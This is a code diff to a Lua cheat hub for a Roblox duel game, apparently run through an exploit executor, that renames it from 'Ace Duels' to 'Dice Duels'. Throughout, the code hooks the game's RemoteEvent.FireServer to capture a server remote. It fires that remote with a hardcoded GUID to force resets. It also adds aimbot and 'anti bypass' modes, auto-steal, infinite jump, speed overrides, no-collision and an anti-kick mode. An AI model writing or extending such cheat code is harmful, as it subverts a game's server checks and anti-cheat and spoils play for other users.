@@ -11,35 +11,35 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local SoundService = game:GetService("SoundService")
 local LP = Players.LocalPlayer
 local PlayerGui = LP:WaitForChild("PlayerGui")
-_G.AceIsMobile = true
-_G.AceCursedResetRemote = _G.AceCursedResetRemote or nil
-_G.AceCursedResetGuid = _G.AceCursedResetGuid or "f888ee6e-c86d-46e1-93d7-0639d6635d42"
+_G.DiceIsMobile = true
+_G.DiceCursedResetRemote = _G.DiceCursedResetRemote or nil
+_G.DiceCursedResetGuid = _G.DiceCursedResetGuid or "f888ee6e-c86d-46e1-93d7-0639d6635d42"
 pcall(function()
-if not _G.AceCursedResetHooked and hookfunction and newcclosure then
-_G.AceCursedResetHooked = true
+if not _G.DiceCursedResetHooked and hookfunction and newcclosure then
+_G.DiceCursedResetHooked = true
 local oldFire
 oldFire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
-if not _G.AceCursedResetRemote and typeof(self) == "Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3) == "RE/" then
-_G.AceCursedResetRemote = self
+if not _G.DiceCursedResetRemote and typeof(self) == "Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3) == "RE/" then
+_G.DiceCursedResetRemote = self
 end
 return oldFire(self, ...)
 end))
 end
 end)
-function _G.AceCursedInstaReset()
-if not _G.AceCursedResetRemote then
+function _G.DiceCursedInstaReset()
+if not _G.DiceCursedResetRemote then
 for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
 if desc:IsA("RemoteEvent") and desc.Name:sub(1,3) == "RE/" then
-_G.AceCursedResetRemote = desc
+_G.DiceCursedResetRemote = desc
 break
 end
 end
 end
-if not _G.AceCursedResetRemote then return end
+if not _G.DiceCursedResetRemote then return end
 local character = LP.Character
 local humanoid = character and character:FindFirstChildOfClass("Humanoid")
 if humanoid and humanoid.Health <= 0 then
-pcall(function() _G.AceCursedResetRemote:FireServer(_G.AceCursedResetGuid, LP, "balloon") end)
+pcall(function() _G.DiceCursedResetRemote:FireServer(_G.DiceCursedResetGuid, LP, "balloon") end)
 return
 end
 local resetDetected = false
@@ -58,16 +58,16 @@ end
 task.spawn(function()
 for _ = 1, 10 do
 if resetDetected then break end
-pcall(function() _G.AceCursedResetRemote:FireServer(_G.AceCursedResetGuid, LP, "balloon") end)
+pcall(function() _G.DiceCursedResetRemote:FireServer(_G.DiceCursedResetGuid, LP, "balloon") end)
 task.wait(0.05)
 end
 for _, conn in ipairs(resetConns) do pcall(function() conn:Disconnect() end) end
 end)
 end
 function cursedInstaReset()
-return _G.AceCursedInstaReset()
+return _G.DiceCursedInstaReset()
 end
-for _, name in ipairs({"RainyHub", "AceDuelsAdaptReconstruct", "AdaptHubPolished", "CyberHub"}) do
+for _, name in ipairs({"DiceDuelsAdaptReconstruct", "AdaptHubPolished", "CyberHub"}) do
 local old = PlayerGui:FindFirstChild(name)
 if old then old:Destroy() end
 end
@@ -76,26 +76,45 @@ local CS = 28.8
 local LAGGER_SPEED = 29
 local LAGGER_CARRY_SPEED = 15
 local currentSpeedMode = "Normal"
+-- With WalkSpeed pinned at 16 the humanoid's ground controller spends
+-- every physics step dragging you back toward 16, so a 55 set on the
+-- assembly is measured at roughly 51 by the time the frame is drawn —
+-- and the same shortfall shows on carry speed. Handing the humanoid the
+-- figure it is meant to be walking at makes it push with the movement
+-- instead of against it, and the number lands where it was set. Always
+-- on, and deliberately not a setting: with it off the speeds simply read
+-- wrong, so there is nothing to choose between.
+diceMatchWalkSpeed = true
+MOVE_KEYS = {
+[Enum.KeyCode.W] = true,
+[Enum.KeyCode.A] = true,
+[Enum.KeyCode.S] = true,
+[Enum.KeyCode.D] = true,
+[Enum.KeyCode.Up] = true,
+[Enum.KeyCode.Left] = true,
+[Enum.KeyCode.Down] = true,
+[Enum.KeyCode.Right] = true,
+}
 autoCarrySpeedEnabled = false
 setAutoCarrySpeedVisual = nil
-_G.AceAutoCarryWasCarrying = false
-_G.AceAutoCarrySavedMode = nil
+_G.DiceAutoCarryWasCarrying = false
+_G.DiceAutoCarrySavedMode = nil
 local autoStealEnabled = false
 local selectedStealMode = "Normal"
 local autoStealRadius = 62
-_G.AceStealRadii = _G.AceStealRadii or {Normal = 62, Semi = 9}
+_G.DiceStealRadii = _G.DiceStealRadii or {Normal = 62, Semi = 9}
 local autoStealRadiusBox = nil
 local selectedAimbotMode = "Normal"
 local AIMBOT_SPEED = 58
 local LAGGER_AIMBOT_SPEED = 40
-_G.AceAntiBypassAimbotSpeed = _G.AceAntiBypassAimbotSpeed or 58
-if _G.AceAntiBypassLaggerAimbotSpeed == nil or tonumber(_G.AceAntiBypassLaggerAimbotSpeed) == 58 then _G.AceAntiBypassLaggerAimbotSpeed = 40 end
+_G.DiceAntiBypassAimbotSpeed = _G.DiceAntiBypassAimbotSpeed or 58
+if _G.DiceAntiBypassLaggerAimbotSpeed == nil or tonumber(_G.DiceAntiBypassLaggerAimbotSpeed) == 58 then _G.DiceAntiBypassLaggerAimbotSpeed = 40 end
 local autoSwingEnabled = false
 local mirrorTPDownEnabled = false
-_G.AceNormalAimbotOn = _G.AceNormalAimbotOn or false
-_G.AceAntiBypassAimbotOn = _G.AceAntiBypassAimbotOn or false
+_G.DiceNormalAimbotOn = _G.DiceNormalAimbotOn or false
+_G.DiceAntiBypassAimbotOn = _G.DiceAntiBypassAimbotOn or false
 local antiDesyncAutoSwingEnabled = false
-_G.AceAntiDesyncAimbotOn = _G.AceAntiDesyncAimbotOn or false
+_G.DiceAntiDesyncAimbotOn = _G.DiceAntiDesyncAimbotOn or false
 local ANTI_DESYNC_AIMBOT_SPEED = 58
 local batCounterEnabled = false
 local medCounterEnabled = false
@@ -111,7 +130,9 @@ local nukeOptimiserEnabled = false
 local fovEnabled = false
 local fovValue = 70
 local noCamCollisionEnabled = false
-_G.AceNoPlayerCollisionEnabled = _G.AceNoPlayerCollisionEnabled or false
+_G.DiceNoPlayerCollisionEnabled = _G.DiceNoPlayerCollisionEnabled or false
+_G.DiceAntiBodylockEnabled = _G.DiceAntiBodylockEnabled or false
+local setAntiBodylockVisual = nil
 local customFontVisualEnabled = false
 local skyTheme = "Off"
 local setPlayerESPVisual = nil
@@ -122,7 +143,7 @@ local setAntiLagVisual = nil
 local setNukeOptimiserVisual = nil
 local setFOVVisual = nil
 local setNoCamCollisionVisual = nil
-_G.AceSetNoPlayerCollisionVisual = _G.AceSetNoPlayerCollisionVisual or nil
+_G.DiceSetNoPlayerCollisionVisual = _G.DiceSetNoPlayerCollisionVisual or nil
 local setCustomFontVisual = nil
 local skyValueLabel = nil
 local autoLeftEnabled = false
@@ -211,13 +232,13 @@ startAutoTP()
 else
 stopAutoTP()
 end
-saveAceConfig()
+saveDiceConfig()
 end
-function _G.AceStopAutoTPForAction()
+function _G.DiceStopAutoTPForAction()
 if autoTPEnabled then
 stopAutoTP()
 pcall(function() if setAutoTPVisual then setAutoTPVisual(false) end end)
-pcall(saveAceConfig)
+pcall(saveDiceConfig)
 end
 end
 local dropBrainrotActive = false
@@ -225,7 +246,7 @@ local DROP_ASCEND_DURATION = 0.2
 local DROP_ASCEND_SPEED = 150
 local function runDropBrainrot()
 if dropBrainrotActive then return end
-if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
+if _G.DiceStopAutoTPForAction then _G.DiceStopAutoTPForAction() end
 local char = LP.Character
 if not char then return end
 local root = char:FindFirstChild("HumanoidRootPart")
@@ -530,16 +551,16 @@ else
 stopAntiRagdoll()
 end
 end
-_G.AceNormalInfJump = _G.AceNormalInfJump or {holdPressed=false, holdActive=false, controllerActive=false, mobilePressed=false, mobileActive=false, hooked={}}
-function _G.AceStopNormalInfJumpHoldState()
-local S = _G.AceNormalInfJump
+_G.DiceNormalInfJump = _G.DiceNormalInfJump or {holdPressed=false, holdActive=false, controllerActive=false, mobilePressed=false, mobileActive=false, hooked={}}
+function _G.DiceStopNormalInfJumpHoldState()
+local S = _G.DiceNormalInfJump
 S.holdPressed = false
 S.holdActive = false
 S.controllerActive = false
 S.mobilePressed = false
 S.mobileActive = false
 end
-function _G.AceApplyNormalInfJumpBoost(boost)
+function _G.DiceApplyNormalInfJumpBoost(boost)
 if not infJumpEnabled then return end
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -548,17 +569,17 @@ if not root or not hum or hum.Health <= 0 then return end
 root.Velocity = Vector3.new(root.Velocity.X, boost or 50, root.Velocity.Z)
 end
 UserInputService.JumpRequest:Connect(function()
-_G.AceApplyNormalInfJumpBoost(50)
+_G.DiceApplyNormalInfJumpBoost(50)
 end)
 UserInputService.InputBegan:Connect(function(input)
 if UserInputService:GetFocusedTextBox() then return end
-local S = _G.AceNormalInfJump
+local S = _G.DiceNormalInfJump
 if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space then
 S.holdPressed = true
 task.delay(0.12, function()
-if _G.AceNormalInfJump.holdPressed and infJumpEnabled then
-_G.AceNormalInfJump.holdActive = true
-_G.AceApplyNormalInfJumpBoost(50)
+if _G.DiceNormalInfJump.holdPressed and infJumpEnabled then
+_G.DiceNormalInfJump.holdActive = true
+_G.DiceApplyNormalInfJumpBoost(50)
 end
 end)
 elseif input.KeyCode == Enum.KeyCode.ButtonA and input.UserInputType.Name:match("^Gamepad") then
@@ -566,7 +587,7 @@ S.controllerActive = true
 end
 end)
 UserInputService.InputEnded:Connect(function(input)
-local S = _G.AceNormalInfJump
+local S = _G.DiceNormalInfJump
 if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space then
 S.holdPressed = false
 S.holdActive = false
@@ -575,78 +596,82 @@ if input.KeyCode == Enum.KeyCode.ButtonA and input.UserInputType.Name:match("^Ga
 S.controllerActive = false
 end
 end)
-function _G.AceHookNormalInfMobileJumpButton(obj)
-local S = _G.AceNormalInfJump
+function _G.DiceHookNormalInfMobileJumpButton(obj)
+local S = _G.DiceNormalInfJump
 if not obj or obj.Name ~= "JumpButton" or not obj:IsA("GuiButton") or S.hooked[obj] then return end
 S.hooked[obj] = true
 obj.InputBegan:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.Touch or not infJumpEnabled then return end
-_G.AceNormalInfJump.mobilePressed = true
+_G.DiceNormalInfJump.mobilePressed = true
 task.delay(0.12, function()
-if _G.AceNormalInfJump.mobilePressed and infJumpEnabled then
-_G.AceNormalInfJump.mobileActive = true
-_G.AceApplyNormalInfJumpBoost(50)
+if _G.DiceNormalInfJump.mobilePressed and infJumpEnabled then
+_G.DiceNormalInfJump.mobileActive = true
+_G.DiceApplyNormalInfJumpBoost(50)
 end
 end)
 end)
 obj.InputEnded:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.Touch then
-_G.AceNormalInfJump.mobilePressed = false
-_G.AceNormalInfJump.mobileActive = false
+_G.DiceNormalInfJump.mobilePressed = false
+_G.DiceNormalInfJump.mobileActive = false
 end
 end)
 obj.AncestryChanged:Connect(function(_, parent)
 if not parent then
-_G.AceNormalInfJump.hooked[obj] = nil
-_G.AceNormalInfJump.mobilePressed = false
-_G.AceNormalInfJump.mobileActive = false
+_G.DiceNormalInfJump.hooked[obj] = nil
+_G.DiceNormalInfJump.mobilePressed = false
+_G.DiceNormalInfJump.mobileActive = false
 end
 end)
 end
 for _, obj in ipairs(PlayerGui:GetDescendants()) do
-_G.AceHookNormalInfMobileJumpButton(obj)
+_G.DiceHookNormalInfMobileJumpButton(obj)
 end
 PlayerGui.DescendantAdded:Connect(function(obj)
-task.defer(_G.AceHookNormalInfMobileJumpButton, obj)
+task.defer(_G.DiceHookNormalInfMobileJumpButton, obj)
 end)
 RunService.Heartbeat:Connect(function()
-local S = _G.AceNormalInfJump
+local S = _G.DiceNormalInfJump
 if infJumpEnabled and (S.holdActive or S.mobileActive or S.controllerActive) then
-_G.AceApplyNormalInfJumpBoost(50)
+_G.DiceApplyNormalInfJumpBoost(50)
 end
 end)
 setInfJumpInternal = function(on)
 infJumpEnabled = on and true or false
 if not infJumpEnabled then
-_G.AceStopNormalInfJumpHoldState()
+_G.DiceStopNormalInfJumpHoldState()
 end
 end
-local currentBackground = 0
-local aceGuiScaleValue = 0.52
-local aceProgressBarScaleValue = 0.83
-CONFIG_FILE = "AceDuels_MainGUI_Config_DefaultsV2.json"
-KEYBINDS_CONFIG_FILE = "AceDuels_Keybinds_DefaultsV2.json"
-_ace_isfile = isfile or (syn and syn.isfile) or function(path)
+local diceGuiScaleValue = 0.52
+local diceProgressBarScaleValue = 0.83
+CONFIG_FILE = "DiceDuels_MainGUI_Config_DefaultsV2.json"
+KEYBINDS_CONFIG_FILE = "DiceDuels_Keybinds_DefaultsV2.json"
+-- The hub used to save under the old name. Settings are read back from
+-- there once when the new file does not exist yet, so renaming the hub
+-- does not silently reset everyone; the next save writes the new file.
+LEGACY_CONFIG_FILE = "AceDuels_MainGUI_Config_DefaultsV2.json"
+LEGACY_KEYBINDS_CONFIG_FILE = "AceDuels_Keybinds_DefaultsV2.json"
+_dice_isfile = isfile or (syn and syn.isfile) or function(path)
 local ok, result = pcall(function() return readfile(path) end)
 return ok and result ~= nil
 end
-_ace_readfile = readfile or (syn and syn.readfile)
-_ace_writefile = writefile or (syn and syn.writefile)
-canSaveConfig = (type(_ace_readfile) == "function" and type(_ace_writefile) == "function")
+_dice_readfile = readfile or (syn and syn.readfile)
+_dice_writefile = writefile or (syn and syn.writefile)
+canSaveConfig = (type(_dice_readfile) == "function" and type(_dice_writefile) == "function")
 
---// Ace Duels Intro + Songs (ported from old source only)
+--// Dice Duels Intro + Songs (ported from old source only)
 selectedIntroMusic = selectedIntroMusic or 1
 _introEnabled = (_introEnabled ~= false)
 setIntroVisual = nil
 setIntroSongVisual = nil
 INTRO_MUSIC_OPTIONS = INTRO_MUSIC_OPTIONS or {
-{name="Song 1", url="https://files.catbox.moe/mzvrir.mp3", file="AceDuelsIntroSong_1.mp3"},
-{name="Song 2", url="https://files.catbox.moe/2a7jyx.mp3", file="AceDuelsIntroSong_2.mp3"},
-{name="Song 3", url="https://files.catbox.moe/rcgr9f.mp3", file="AceDuelsIntroSong_3.mp3"},
-{name="Song 4", url="https://files.catbox.moe/iknfuh.mp3", file="AceDuelsIntroSong_4.mp3"},
-{name="Song 5", url="https://files.catbox.moe/6eigoh.mp3", file="AceDuelsIntroSong_5.mp3"},
-{name="Song 6", url="https://files.catbox.moe/dvjtjk.mp3", file="AceDuelsIntroSong_6.mp3"},
-{name="Song 7", url="https://files.catbox.moe/iyw1cb.mp3", file="AceDuelsIntroSong_7.mp3"},
+{name="Song 1", url="https://files.catbox.moe/mzvrir.mp3", file="DiceDuelsIntroSong_1.mp3"},
+{name="Song 2", url="https://files.catbox.moe/2a7jyx.mp3", file="DiceDuelsIntroSong_2.mp3"},
+{name="Song 3", url="https://files.catbox.moe/rcgr9f.mp3", file="DiceDuelsIntroSong_3.mp3"},
+{name="Song 4", url="https://files.catbox.moe/iknfuh.mp3", file="DiceDuelsIntroSong_4.mp3"},
+{name="Song 5", url="https://files.catbox.moe/6eigoh.mp3", file="DiceDuelsIntroSong_5.mp3"},
+{name="Song 6", url="https://files.catbox.moe/dvjtjk.mp3", file="DiceDuelsIntroSong_6.mp3"},
+{name="Song 7", url="https://files.catbox.moe/iyw1cb.mp3", file="DiceDuelsIntroSong_7.mp3"},
 }
 function getIntroSongName()
 local opt = INTRO_MUSIC_OPTIONS[selectedIntroMusic]
@@ -680,7 +705,7 @@ end
 function cacheIntroSong(option, allowDownload)
 if not option or not option.url or option.url == "" then return nil end
 if not (writefile and getcustomasset) then return nil end
-local fileName = option.file or ("AceDuelsIntroSong_" .. tostring(option.name or "song") .. ".mp3")
+local fileName = option.file or ("DiceDuelsIntroSong_" .. tostring(option.name or "song") .. ".mp3")
 local function loadExisting()
 if introSongCache[fileName] then return introSongCache[fileName] end
 local hasFile = false
@@ -726,7 +751,7 @@ end
 function makeIntroSoundFromId(soundId, name, parent)
 if not soundId then return nil end
 local sound = Instance.new("Sound")
-sound.Name = name or "AceDuelsIntroMusic"
+sound.Name = name or "DiceDuelsIntroMusic"
 sound.Volume = 0.65
 sound.Looped = false
 sound.SoundId = soundId
@@ -746,7 +771,7 @@ if not INTRO_MUSIC_OPTIONS[index] then _safeNotify("ADD SONG LINKS"); return end
 local token = introPreviewToken
 task.spawn(function()
 local option = INTRO_MUSIC_OPTIONS[index]
-local sound = createIntroSound(option, "AceDuelsIntroPreview_" .. tostring(token), SoundService, true)
+local sound = createIntroSound(option, "DiceDuelsIntroPreview_" .. tostring(token), SoundService, true)
 if token ~= introPreviewToken then if sound then sound:Destroy() end; return end
 introPreviewSound = sound
 if not sound then _safeNotify("SONG LOADING..."); return end
@@ -763,7 +788,7 @@ local option = INTRO_MUSIC_OPTIONS[selectedIntroMusic]
 if not option then return end
 local token = introPlaybackToken
 task.spawn(function()
-local sound = createIntroSound(option, "AceDuelsIntroMusic_" .. tostring(token), SoundService, true)
+local sound = createIntroSound(option, "DiceDuelsIntroMusic_" .. tostring(token), SoundService, true)
 if token ~= introPlaybackToken or not _introEnabled then if sound then pcall(function() sound:Destroy() end) end; return end
 introPlaybackSound = sound
 if not sound then _safeNotify("SONG FAILED"); return end
@@ -777,10 +802,10 @@ end
 preloadIntroSongs()
 
 savedConfig = {}
-_G.AceGuiLocked = _G.AceGuiLocked == true
-_G.AceHideMobileButtons = false -- pad is always shown
-_G.AceMobileButtonScale = 0.75
-_G.AceMobileButtonPositions = _G.AceMobileButtonPositions or {}
+_G.DiceGuiLocked = _G.DiceGuiLocked == true
+_G.DiceHideMobileButtons = false -- pad is always shown
+_G.DiceMobileButtonScale = 0.75
+_G.DiceMobileButtonPositions = _G.DiceMobileButtonPositions or {}
 savedMainPositionTable = nil
 savedMiniPositionTable = nil
 function udim2ToTable(u)
@@ -792,16 +817,18 @@ return UDim2.new(tonumber(t.xs) or 0, tonumber(t.xo) or 0, tonumber(t.ys) or 0, 
 end
 return fallback
 end
-function collectAceMobileButtonPositions()
+function collectDiceMobileButtonPositions()
+-- The buttons live in one draggable panel now, so only its position is
+-- worth storing. Older configs held a position per button; those keys
+-- are simply ignored.
 local out = {}
-for key, entry in pairs(_G.AceMobileButtonRefs or {}) do
-local holder = entry and entry.holder
-if holder then out[key] = udim2ToTable(holder.Position) end
+if _G.DiceMobilePanel then
+out.panel = udim2ToTable(_G.DiceMobilePanel.Position)
 end
-if next(out) == nil and type(_G.AceMobileButtonPositions) == "table" then
-return _G.AceMobileButtonPositions
+if next(out) == nil and type(_G.DiceMobileButtonPositions) == "table" then
+return _G.DiceMobileButtonPositions
 end
-_G.AceMobileButtonPositions = out
+_G.DiceMobileButtonPositions = out
 return out
 end
 function keyToString(key)
@@ -822,7 +849,7 @@ out[keyId] = keyToString(key)
 end
 return out
 end
-function collectAceKeybindConfig()
+function collectDiceKeybindConfig()
 return {
 keybinds = keybindsToTable(),
 tpDownKeybind = keyToString(tpDownKeybind),
@@ -836,13 +863,13 @@ speedKeybinds[keyId] = stringToKeyCode(t[keyId])
 end
 end
 end
-function applyDefaultAceKeybinds()
+function applyDefaultDiceKeybinds()
 for keyId, key in pairs(DEFAULT_SPEED_KEYBINDS) do
 speedKeybinds[keyId] = key
 end
 tpDownKeybind = DEFAULT_TP_DOWN_KEYBIND
 end
-function collectAceConfig()
+function collectDiceConfig()
 return {
 mainPosition = savedMainPositionTable,
 keybinds = keybindsToTable(),
@@ -861,19 +888,19 @@ selectedAnimationPack = selectedAnimationPack,
 selectedStealMode = selectedStealMode,
 autoStealEnabled = autoStealEnabled,
 autoStealRadius = autoStealRadius,
-aceStealRadii = _G.AceStealRadii,
+diceStealRadii = _G.DiceStealRadii,
 selectedAimbotMode = selectedAimbotMode,
 AIMBOT_SPEED = AIMBOT_SPEED,
 LAGGER_AIMBOT_SPEED = LAGGER_AIMBOT_SPEED,
-ANTI_BYPASS_AIMBOT_SPEED = _G.AceAntiBypassAimbotSpeed,
-ANTI_BYPASS_LAGGER_AIMBOT_SPEED = _G.AceAntiBypassLaggerAimbotSpeed,
+ANTI_BYPASS_AIMBOT_SPEED = _G.DiceAntiBypassAimbotSpeed,
+ANTI_BYPASS_LAGGER_AIMBOT_SPEED = _G.DiceAntiBypassLaggerAimbotSpeed,
 ANTI_DESYNC_AIMBOT_SPEED = ANTI_DESYNC_AIMBOT_SPEED,
 autoSwingEnabled = autoSwingEnabled,
 mirrorTPDownEnabled = mirrorTPDownEnabled,
-normalAimbotEnabled = _G.AceNormalAimbotOn == true,
-antiBypassAimbotEnabled = _G.AceAntiBypassAimbotOn == true,
+normalAimbotEnabled = _G.DiceNormalAimbotOn == true,
+antiBypassAimbotEnabled = _G.DiceAntiBypassAimbotOn == true,
 antiDesyncAutoSwingEnabled = antiDesyncAutoSwingEnabled,
-antiDesyncAimbotEnabled = _G.AceAntiDesyncAimbotOn == true,
+antiDesyncAimbotEnabled = _G.DiceAntiDesyncAimbotOn == true,
 batCounterEnabled = batCounterEnabled,
 medCounterEnabled = medCounterEnabled,
 safeMode = antiKickEnabled == true,
@@ -887,49 +914,61 @@ nukeOptimiserEnabled = nukeOptimiserEnabled,
 fovEnabled = fovEnabled,
 fovValue = fovValue,
 noCamCollisionEnabled = noCamCollisionEnabled,
-noPlayerCollisionEnabled = _G.AceNoPlayerCollisionEnabled,
+noPlayerCollisionEnabled = _G.DiceNoPlayerCollisionEnabled,
+antiBodylockEnabled = _G.DiceAntiBodylockEnabled == true,
 customFontVisualEnabled = false,
 skyTheme = skyTheme,
+lightningEnabled = _G.DiceLightningEnabled ~= false,
 autoLeftEnabled = autoLeftEnabled,
 autoRightEnabled = autoRightEnabled,
-currentBackground = currentBackground,
-aceGuiScaleValue = aceGuiScaleValue,
-aceProgressBarScaleValue = aceProgressBarScaleValue,
+diceGuiScaleValue = diceGuiScaleValue,
+diceProgressBarScaleValue = diceProgressBarScaleValue,
 introEnabled = _introEnabled == true,
 selectedIntroMusic = selectedIntroMusic,
-guiLocked = _G.AceGuiLocked == true,
-hideMobileButtons = _G.AceHideMobileButtons == true,
-aceMobileButtonScale = _G.AceMobileButtonScale,
-mobileButtonPositions = collectAceMobileButtonPositions(),
+guiLocked = _G.DiceGuiLocked == true,
+hideMobileButtons = _G.DiceHideMobileButtons == true,
+diceMobileButtonScale = _G.DiceMobileButtonScale,
+mobileButtonPositions = collectDiceMobileButtonPositions(),
 }
 end
-function saveAceConfig()
+function saveDiceConfig()
 if not canSaveConfig then return end
 pcall(function()
-_ace_writefile(CONFIG_FILE, HttpService:JSONEncode(collectAceConfig()))
-_ace_writefile(KEYBINDS_CONFIG_FILE, HttpService:JSONEncode(collectAceKeybindConfig()))
+_dice_writefile(CONFIG_FILE, HttpService:JSONEncode(collectDiceConfig()))
+_dice_writefile(KEYBINDS_CONFIG_FILE, HttpService:JSONEncode(collectDiceKeybindConfig()))
 end)
 end
-function loadAceConfig()
-if not canSaveConfig or not _ace_isfile(CONFIG_FILE) then return end
+function loadDiceConfig()
+if not canSaveConfig then return end
+local configPath = CONFIG_FILE
+if not _dice_isfile(configPath) then
+if not _dice_isfile(LEGACY_CONFIG_FILE) then return end
+configPath = LEGACY_CONFIG_FILE
+end
 local ok, data = pcall(function()
-return HttpService:JSONDecode(_ace_readfile(CONFIG_FILE))
+return HttpService:JSONDecode(_dice_readfile(configPath))
 end)
 if not ok or type(data) ~= "table" then return end
 savedConfig = data
 local keybindData = data
 pcall(function()
-if _ace_isfile(KEYBINDS_CONFIG_FILE) then
-local kb = HttpService:JSONDecode(_ace_readfile(KEYBINDS_CONFIG_FILE))
+local keybindPath = nil
+if _dice_isfile(KEYBINDS_CONFIG_FILE) then
+keybindPath = KEYBINDS_CONFIG_FILE
+elseif _dice_isfile(LEGACY_KEYBINDS_CONFIG_FILE) then
+keybindPath = LEGACY_KEYBINDS_CONFIG_FILE
+end
+if keybindPath then
+local kb = HttpService:JSONDecode(_dice_readfile(keybindPath))
 if type(kb) == "table" then keybindData = kb end
 end
 end)
 savedMainPositionTable = data.mainPosition
 savedMiniPositionTable = nil
-_G.AceGuiLocked = data.guiLocked == true
-_G.AceHideMobileButtons = false
-_G.AceMobileButtonScale = math.clamp(tonumber(data.aceMobileButtonScale) or tonumber(_G.AceMobileButtonScale) or 0.75, 0.30, 1.35)
-_G.AceMobileButtonPositions = type(data.mobileButtonPositions) == "table" and data.mobileButtonPositions or {}
+_G.DiceGuiLocked = data.guiLocked == true
+_G.DiceHideMobileButtons = false
+_G.DiceMobileButtonScale = math.clamp(tonumber(data.diceMobileButtonScale) or tonumber(_G.DiceMobileButtonScale) or 0.75, 0.30, 1.35)
+_G.DiceMobileButtonPositions = type(data.mobileButtonPositions) == "table" and data.mobileButtonPositions or {}
 applySavedKeybinds(keybindData.keybinds)
 if keybindData.tpDownKeybind ~= nil then
 if tostring(keybindData.tpDownKeybind) == "None" then
@@ -959,34 +998,34 @@ selectedAnimationPack = data.selectedAnimationPack or selectedAnimationPack
 selectedStealMode = data.selectedStealMode or selectedStealMode
 if selectedStealMode ~= "Semi" then selectedStealMode = "Normal" end
 autoStealEnabled = data.autoStealEnabled == true
-if type(data.aceStealRadii) == "table" then
-_G.AceStealRadii.Normal = tonumber(data.aceStealRadii.Normal) or _G.AceStealRadii.Normal or 62
-_G.AceStealRadii.Semi = tonumber(data.aceStealRadii.Semi) or _G.AceStealRadii.Semi or 9
+if type(data.diceStealRadii) == "table" then
+_G.DiceStealRadii.Normal = tonumber(data.diceStealRadii.Normal) or _G.DiceStealRadii.Normal or 62
+_G.DiceStealRadii.Semi = tonumber(data.diceStealRadii.Semi) or _G.DiceStealRadii.Semi or 9
 end
 autoStealRadius = tonumber(data.autoStealRadius) or autoStealRadius
 if selectedStealMode == "Normal" then
-_G.AceStealRadii.Normal = tonumber(autoStealRadius) or _G.AceStealRadii.Normal or 62
-autoStealRadius = _G.AceStealRadii.Normal
+_G.DiceStealRadii.Normal = tonumber(autoStealRadius) or _G.DiceStealRadii.Normal or 62
+autoStealRadius = _G.DiceStealRadii.Normal
 else
-autoStealRadius = _G.AceStealRadii.Semi or 9
+autoStealRadius = _G.DiceStealRadii.Semi or 9
 end
 selectedAimbotMode = data.selectedAimbotMode or selectedAimbotMode
 if selectedAimbotMode ~= "Anti Bypass" then selectedAimbotMode = "Normal" end
 AIMBOT_SPEED = tonumber(data.AIMBOT_SPEED) or AIMBOT_SPEED
 LAGGER_AIMBOT_SPEED = tonumber(data.LAGGER_AIMBOT_SPEED) or LAGGER_AIMBOT_SPEED
-_G.AceAntiBypassAimbotSpeed = tonumber(data.ANTI_BYPASS_AIMBOT_SPEED) or _G.AceAntiBypassAimbotSpeed or 58
+_G.DiceAntiBypassAimbotSpeed = tonumber(data.ANTI_BYPASS_AIMBOT_SPEED) or _G.DiceAntiBypassAimbotSpeed or 58
 if data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED == nil or tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) == 58 then
-_G.AceAntiBypassLaggerAimbotSpeed = 40
+_G.DiceAntiBypassLaggerAimbotSpeed = 40
 else
-_G.AceAntiBypassLaggerAimbotSpeed = tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) or 40
+_G.DiceAntiBypassLaggerAimbotSpeed = tonumber(data.ANTI_BYPASS_LAGGER_AIMBOT_SPEED) or 40
 end
 ANTI_DESYNC_AIMBOT_SPEED = tonumber(data.ANTI_DESYNC_AIMBOT_SPEED) or ANTI_DESYNC_AIMBOT_SPEED or 58
 autoSwingEnabled = data.autoSwingEnabled == true
 mirrorTPDownEnabled = data.mirrorTPDownEnabled == true
-_G.AceNormalAimbotOn = data.normalAimbotEnabled == true
-_G.AceAntiBypassAimbotOn = data.antiBypassAimbotEnabled == true
+_G.DiceNormalAimbotOn = data.normalAimbotEnabled == true
+_G.DiceAntiBypassAimbotOn = data.antiBypassAimbotEnabled == true
 antiDesyncAutoSwingEnabled = data.antiDesyncAutoSwingEnabled == true
-_G.AceAntiDesyncAimbotOn = data.antiDesyncAimbotEnabled == true
+_G.DiceAntiDesyncAimbotOn = data.antiDesyncAimbotEnabled == true
 batCounterEnabled = data.batCounterEnabled == true
 medCounterEnabled = data.medCounterEnabled == true
 antiKickEnabled = data.safeMode == true
@@ -1000,16 +1039,18 @@ nukeOptimiserEnabled = data.nukeOptimiserEnabled == true
 fovEnabled = data.fovEnabled == true
 fovValue = tonumber(data.fovValue) or fovValue
 noCamCollisionEnabled = data.noCamCollisionEnabled == true
-_G.AceNoPlayerCollisionEnabled = data.noPlayerCollisionEnabled == true
+_G.DiceNoPlayerCollisionEnabled = data.noPlayerCollisionEnabled == true
+_G.DiceAntiBodylockEnabled = data.antiBodylockEnabled == true
 customFontVisualEnabled = false
 skyTheme = (type(data.skyTheme) == "string" and data.skyTheme) or skyTheme
+if data.lightningEnabled ~= nil then _G.DiceLightningEnabled = data.lightningEnabled ~= false else _G.DiceLightningEnabled = true end
 autoLeftEnabled = data.autoLeftEnabled == true
 autoRightEnabled = data.autoRightEnabled == true
 if data.introEnabled ~= nil then _introEnabled = data.introEnabled == true end
 if data.selectedIntroMusic and INTRO_MUSIC_OPTIONS[data.selectedIntroMusic] then selectedIntroMusic = data.selectedIntroMusic end
 if autoLeftEnabled and autoRightEnabled then autoRightEnabled = false end
 end
-loadAceConfig()
+loadDiceConfig()
 local function syncAnimationPackIndex()
 for i, name in ipairs(AnimationPackList) do
 if name == selectedAnimationPack then
@@ -1044,48 +1085,48 @@ LP.CharacterAdded:Connect(function(char)
 task.wait(0.65)
 applySavedAnimationPackToCharacter(char)
 end)
